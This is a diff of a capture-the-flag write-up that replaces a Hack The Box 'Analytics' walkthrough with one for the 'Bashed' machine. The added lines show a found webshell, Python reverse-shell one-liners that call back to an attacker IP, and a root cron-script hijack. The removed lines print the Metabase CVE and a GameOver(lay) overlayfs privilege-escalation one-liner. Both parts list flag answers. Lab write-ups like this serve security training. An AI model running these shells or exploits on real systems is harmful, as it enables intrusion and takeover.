@@ -17,8 +17,8 @@ Create a directory on the Desktop with the machine's name, and inside this direc
 ### Task 2 - Reconnaissance
 
 <pre class="language-bash"><code class="lang-bash">su
-<strong>echo "1xxxxxxxxxxxxxxxxxxx bashed.htb" >> /etc/hosts
-</strong>
+echo "10.129.236.215 bashed.htb" >> /etc/hosts
+
 mkdir -p htb/bashed.htb
 cd htb/bashed.htb
 mkdir {nmap,content,exploits,scripts}
@@ -31,204 +31,202 @@ I prefer to start recon by pinging the target, this allows us to check connectiv
 
 ```bash
 ping -c 3 bashed.htb
-
-
-
+PING bashed.htb (10.129.236.215) 56(84) bytes of data.
+64 bytes from bashed.htb (10.129.236.215): icmp_seq=1 ttl=63 time=67.3 ms
+64 bytes from bashed.htb (10.129.236.215): icmp_seq=2 ttl=63 time=64.2 ms
+64 bytes from bashed.htb (10.129.236.215): icmp_seq=3 ttl=63 time=79.4 ms
 ```
 
 Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target should be a \*nix system, while Windows systems usually have a TTL of 128 secs.
 
-### 2.1 - xxx?
+### 2.1 - How many open TCP ports are listening on Bashed??
 
 ```bash
 nmap -p0- -sS -Pn -vvv bashed.htb -oN nmap/tcp_port_scan
 ```
 
 ```bash
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack ttl 63
 ```
 
 <table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sS</td><td>SynScan</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>
 
-It looks like there are 2 open TCP ports on the machine: 22, 80.
+It looks like there's 1 open TCP port on the machine: 80
 
 {% hint style="info" %}
-2
+1
 {% endhint %}
 
-### 2.2 - xxx?
+### 2.2 - What is the relative path on the webserver to a folder that contains phpbash.php??
 
 Now, we take more precise scan utilizing -sCV flags to retrieve versioning services and test common scripts.
 
 ```bash
-nmap -p22,80 -sS -Pn -n -v -sCV -T4 bashed.htb -oG nmap/port_scan
+nmap -p80 -sS -Pn -n -v -sCV -T4 bashed.htb -oG nmap/port_scan
 ```
 
 ```
-PORT   STATE SERVICE    VERSION
-22/tcp open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Arrexel's Development Site
+|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
 ```
-
-Since we lack credentials for SSH login, we will begin by examining port 80.
 
 #### Port 80
 
-Seeing http-title there's a new subdomain: http://analytical.htb/ and browsing on http port we notice there're being redirected (status code 302) to analytical.htb.
+Browsing webserver on port 80 via browser, that contains a web php bash.
 
-We can confirm it using a web proxy such as Burp Suite:
+<figure><img src="../.gitbook/assets/image (302).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (287).png" alt=""><figcaption></figcaption></figure>
-
-To resolve this, we add the domain to our /etc/hosts file
-
-<figure><img src="../.gitbook/assets/image (286).png" alt=""><figcaption></figcaption></figure>
-
-<figure><img src="../.gitbook/assets/image (288).png" alt=""><figcaption></figcaption></figure>
-
-The task is to retrieve a new subdomain configured to provide a different application on the target web server, we found it discovering source code of web page:
-
-<figure><img src="../.gitbook/assets/image (289).png" alt=""><figcaption></figcaption></figure>
-
-This URL refers to login page, and to resolve it we need to add it to /etc/hosts
-
-<figure><img src="../.gitbook/assets/image (290).png" alt=""><figcaption></figcaption></figure>
-
-{% hint style="info" %}
-data.analytical.htb
-{% endhint %}
-
-### 2.3 - What application is running on data.analytical.htb?
-
-By running WhatWeb or simply viewing the page, we discover that there is a Metabase web application.
+Analyzing source code we don't found nothing of interesting, than we can discover more info about website using whatweb and do directory enumeration using gobuster.
 
 ```bash
-whatweb http://data.analytical.htb/
-http://data.analytical.htb/ [200 OK] Cookies[metabase.DEVICE], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[metabase.DEVICE], IP[10.129.229.224], Script[application/json], Strict-Transport-Security[max-age=31536000], Title[Metabase], UncommonHeaders[x-permitted-cross-domain-policies,x-content-type-options,content-security-policy], X-Frame-Options[DENY], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block], nginx[1.18.0]
+whatweb bashed.htb
+http://bashed.htb [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.236.215], JQuery, Meta-Author[Colorlib], Script[text/javascript], Title[Arrexel's Development Site]
 ```
 
-<figure><img src="../.gitbook/assets/image (291).png" alt=""><figcaption></figcaption></figure>
+```
+gobuster dir -u http://bashed.htb -w /usr/share/wordlists/dirb/common.txt
+```
+
+<div align="left">
+
+<figure><img src="../.gitbook/assets/image (303).png" alt=""><figcaption></figcaption></figure>
+
+</div>
+
+Very good, we've found interisting web dir such as /dev and /uploads, exploring them we can answer at our question.
+
+<figure><img src="../.gitbook/assets/image (304).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-Metabase
+/dev
 {% endhint %}
 
-### 2.4 -  What version of Metabase is the target running?
+### 2.3 - What user is the webserver running as on Bashed?
 
-Using WhatWeb and an nmap scan, we were able to discover the Metabase version. However, it is simpler to retrieve this information by viewing the source code of the web page.
+The /dev directory contains two php webshell, more probably phpbash.min.php is a minimal bash or beta version while phpbash.php is full version.
 
-<figure><img src="../.gitbook/assets/image (292).png" alt=""><figcaption></figcaption></figure>
+In both cases, we immediately observe that the user in use is the same.
 
-{% hint style="info" %}
-v0.46.6
-{% endhint %}
-
-
-
-### 2.5 - What is the 2023 CVE ID assigned to the pre-authentication, remote code execution vulnerability in this version of Metabase?
-
-Googling it, we found CVE ID relative to Metabase v0.46.6
-
-{% embed url="https://nvd.nist.gov/vuln/detail/CVE-2023-38646" %}
+<figure><img src="../.gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-CVE-2023-38646
-{% endhint %}
-
-{% hint style="info" %}
-metabase
-{% endhint %}
-
-### 2.9 -  Which environment variable contains the password for the metalytics user?
-
-This questions take us an important hint to understand what we can do.
-
-Infact, using command export, that show us environment variable we found credentials
-
-<figure><img src="../.gitbook/assets/image (296).png" alt=""><figcaption></figcaption></figure>
-
-{% hint style="info" %}
-META\_PASS
+www-data
 {% endhint %}
 
 ### Task 3 - Find user flag
 
-### 3.1 - Submit the flag located in the metalytics user's home directory.
+### 3.1 - Submit the flag located in the arrexel user's home directory.
 
-Upon checking with `sudo -l`, we found that we do not have permissions. However, considering we have discovered another open port 22 (SSH), we can attempt to use the credentials we just found to log in.
+Navigating into file system is more simple discover users home directories and arrexel user's flag.
 
-`ssh metalytics@analytics.htb`
-
-<figure><img src="../.gitbook/assets/image (297).png" alt=""><figcaption></figcaption></figure>
-
-<figure><img src="../.gitbook/assets/image (298).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>
 
 <details>
 
 <summary>🚩 Flag 1 (user.txt)</summary>
 
-5d03664f2ed9ba6767660926fcaa97b9
+b2e6af7c997eba350b6cf95ad88240cb
 
 </details>
 
-### 3.2 - What kernel version is installed on the host system?
+### 3.2 - www-data can run any command as a user without a password. What is that user's username?
 
-We use `uname -a` command to display kernel version
+Using sudo -l we can see that www-data can run all commands on bashed as a user scriptmanager.
+
+<figure><img src="../.gitbook/assets/image (307).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+scriptmanager
+{% endhint %}
+
+### 3.3 - What folder in the system root can scriptmanager access that www-data could not?
+
+Going into root dir / we can launch ls -l and see all permissions regarding directories.
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (299).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (308).png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
 {% hint style="info" %}
-6.2.0-25-generic
+/scripts
 {% endhint %}
 
-### 3.3 - What Ubuntu release is the system running?
+### 3.4 - What is filename of the file that is being run by root every couple minutes?
 
-We can use `lsb_release -a` or `cat /etc/os-release`\
+"Every couple minutes" is an hint to understand possibile route.
 
+But, we decide to give a reverse shell on our attacker machine to optimize our work, to do it we need to make us in listening mode using netcat `nc -lvnp 1339` and execute a python script on web shell.
 
-<figure><img src="../.gitbook/assets/image (300).png" alt=""><figcaption></figcaption></figure>
+```python
+export RHOST="10.10.14.6";export RPORT=1339;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+```
+
+<div align="left">
+
+<figure><img src="../.gitbook/assets/image (309).png" alt=""><figcaption></figcaption></figure>
+
+</div>
+
+Remembering the question's hint and the last task, where only the scriptmanager can access the /scripts folder, we can access it as the scriptmanager user spawning a a bash shell
+
+```bash
+sudo -u scriptmanager python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Trying to use sudo -l commands, the system asks us for a password that we don't know.
+
+Now, we've permissions access to /scripts dir, where we found two files:
+
+<div align="left">
+
+<figure><img src="../.gitbook/assets/image (310).png" alt=""><figcaption></figcaption></figure>
+
+</div>
+
+Additionally, the program `test.py` appears to be scheduled to execute almost every minute, based on the last access time of `test.txt`. From this, we can infer that there may be a cron job owned by root that automatically runs `test.py` every minute. We can confirm this by renaming `test.txt` (e.g., to `test.txt.old`) and observing that a new `test.txt` file is created after a minute or so."
+
+This is useful because we can modify the contents of `test.py` to include reverse shell code, which would then execute with root privileges.
+
+Next, let's create a new file named `test.py` on our Kali box and insert the same reverse shell code we used earlier. We'll then transfer this file to the target 'Bashed' machine.
+
+```python
+echo "import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(('10.10.14.6',4444));
+os.dup2(s.fileno(),0); 
+os.dup2(s.fileno(),1); 
+os.dup2(s.fileno(),2);
+p=subprocess.call(['/bin/sh','-i']);" > test.py
+```
 
 {% hint style="info" %}
-UBUNTU 22.04.03 LTS (JAMMY)
-{% endhint %}
-
-### 3.4 - What component used by the Ubuntu operating system on the target system is vulnerable to a privileges escalation vulnerability assigned two 2023 CVEs?
-
-After finding an old version of the kernel, I'll search on Google to find a public exploit.
-
-{% embed url="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629" %}
-
-{% hint style="info" %}
-overlayfs
+test.py
 {% endhint %}
 
 ### Task 4 - Find root flag
 
-### 4.1 - Submit the flag located in the root user's home directory.
+### 4.1 - Submit the flag located in root's home directory.
 
-As explained into github below, we can do GameOver(lay) Ubuntu Privilege Escalation
+Immediately before or at least within two minutes we listen with netcat on the attacker machine, and we obtain a shell with root permissions.
 
-{% embed url="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629?source=post_page-----fd256a170fae--------------------------------" %}
+<div align="left">
 
-Then, executing bash script, we have become root and can now access the root flag.
+<figure><img src="../.gitbook/assets/image (313).png" alt=""><figcaption></figcaption></figure>
 
-```bash
-unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
-```
-
-<figure><img src="../.gitbook/assets/image (301).png" alt=""><figcaption></figcaption></figure>
+</div>
 
 <details>
 
 <summary>🚩 Flag 2 (root.txt)</summary>
 
-2ec3181b64936d66aae6e2bc1215a477
+40ca417765210f39b12b2d78813ebcfe
 
 </details>
-
-<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
